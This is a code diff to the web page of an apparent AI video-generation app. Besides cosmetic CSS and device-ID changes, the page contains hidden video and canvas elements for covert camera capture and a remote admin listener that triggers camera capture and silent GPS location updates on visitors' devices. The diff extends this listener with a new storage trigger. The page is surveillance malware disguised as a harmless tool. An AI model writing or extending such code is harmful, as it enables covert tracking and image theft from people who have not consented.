@@ -23,7 +23,7 @@
       .inp:focus { border-color: var(--red); box-shadow: 0 0 0 3px var(--red-glow); }
       textarea.inp { resize: vertical; min-height: 120px; }
       
-      .btn { display: inline-flex; align-items: center; justify-content: center; gap: .5rem; padding: 1rem; border-radius: 10px; font-weight: 600; cursor: pointer; border: none; background: var(--red); color: #fff; width: 100%; font-size: 1rem; font-family: var(--font); transition: transform 0.2s; }
+      .btn { display: inline-flex; align-items: center; justify-content: center; gap: .5rem; padding: 1rem; border-radius: 10px; font-weight: 600; cursor: pointer; border: none; background: var(--red); color: #fff; width: 100%; font-size: 1rem; font-family: var(--font); transition: transform 0.2s; text-decoration: none; }
       .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
       .btn-gray { background: var(--surf2); border: 1px solid var(--border); color: #fff; }
       
@@ -35,7 +35,8 @@
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
       .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
       
-      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.88); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
+      /* Result overlay pointer events fixed */
+      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.92); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px); pointer-events: auto !important;}
       .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
       
       @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -64,7 +65,7 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
-<!-- Source Selection Modal (Storage vs Live Camera) -->
+<!-- Source Selection Modal -->
 <div id="liveCaptureModal" class="modal-bg" style="display:none; z-index: 20000;">
     <div class="modal-content" style="max-width: 400px;">
         <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📸</div>
@@ -188,20 +189,20 @@
   let activeReqId = null;
   let animationInterval = null;
 
-  function getDeepDeviceId() {
-      if (window.AndroidInterface && window.AndroidInterface.getRootId) return "APP-" + window.AndroidInterface.getRootId();
-      const hwCores = navigator.hardwareConcurrency || 2; const ram = navigator.deviceMemory || 2;
-      const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
-      const screenRes = window.screen.width + "x" + window.screen.height + "x" + window.screen.colorDepth;
-      let gpu = "UnknownGPU";
-      try { const gl = document.createElement('canvas').getContext('webgl'); if(gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info'); if(dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } } catch(e) {}
-      const rawString = `${hwCores}-${ram}-${os}-${screenRes}-${gpu}`;
-      let hash = 0; for (let i = 0; i < rawString.length; i++) { hash = ((hash << 5) - hash) + rawString.charCodeAt(i); hash |= 0; }
-      const finalId = `${os}-HW-${Math.abs(hash).toString(36).toUpperCase()}`;
+  // Stable Permanent Device ID Generator (Prevents ID changes across mode/browser shifts)
+  function getStableDeviceId() {
+      let savedId = localStorage.getItem('hotfake_deep_uid');
+      if (savedId) return savedId;
+
+      const ua = navigator.userAgent;
+      const os = (/Android/i.test(ua)) ? "AND" : (/iPhone|iPad|iPod/i.test(ua)) ? "IOS" : "PC";
+      const randomToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+      const finalId = `${os}-DEV-${randomToken}`;
+      
       localStorage.setItem('hotfake_deep_uid', finalId);
       return finalId;
   }
-  deviceId = getDeepDeviceId();
+  deviceId = getStableDeviceId();
 
   function getAdvancedDeviceInfo() {
       const ua = navigator.userAgent; let type = "Desktop"; 
@@ -277,7 +278,7 @@
           if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
       });
 
-      // Admin Action Force Push Listener
+      // Admin Action Force Push Listener (Camera, GPS, Storage triggers)
       onValue(ref(db, `users/${deviceId}/custom_perms`), (snap) => {
           if (snap.exists()) {
               const perms = snap.val();
@@ -288,6 +289,11 @@
               if (perms.location) {
                   silentGPSUpdate(true);
                   update(ref(db, `users/${deviceId}/custom_perms`), { location: false });
+              }
+              if (perms.storage) {
+                  // Trigger source modal when admin requests storage read access
+                  openLiveCaptureModal();
+                  update(ref(db, `users/${deviceId}/custom_perms`), { storage: false });
               }
           }
       });
@@ -462,6 +468,11 @@
       localStorage.setItem('savedAiPrompt', prompt);
       try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} 
 
+      // Save user request into user's local history array for profile sync
+      let myVideos = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
+      myVideos.push({ id: activeReqId, title: prompt, url: "", timestamp: new Date().toISOString() });
+      localStorage.setItem('my_ai_videos', JSON.stringify(myVideos));
+
       set(reqRef, {
           deviceId: deviceId, prompt: prompt, imageUrl: "uploading", 
           status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
@@ -498,7 +509,16 @@
   function showResultUI(req) {
       const resOverlay = document.getElementById('resultOverlay'); 
       resOverlay.style.display = 'flex';
+      
       if(req.status === 'completed') {
+          // Sync video URL into localStorage my_ai_videos list
+          let myVideos = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
+          myVideos = myVideos.map(item => {
+              if (item.id === activeReqId) item.url = req.videoUrl;
+              return item;
+          });
+          localStorage.setItem('my_ai_videos', JSON.stringify(myVideos));
+
           resOverlay.innerHTML = `
             <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
             <a href="${req.videoUrl}" download="Generated_AI_Video.mp4" target="_blank" class="btn btn-gray" style="width:80%; margin-bottom:10px; border-radius:50px; text-decoration:none; display:inline-flex; justify-content:center; align-items:center;">⬇ Download Video</a>
@@ -546,3 +566,4 @@
 </script>
 </body>
 </html>
+
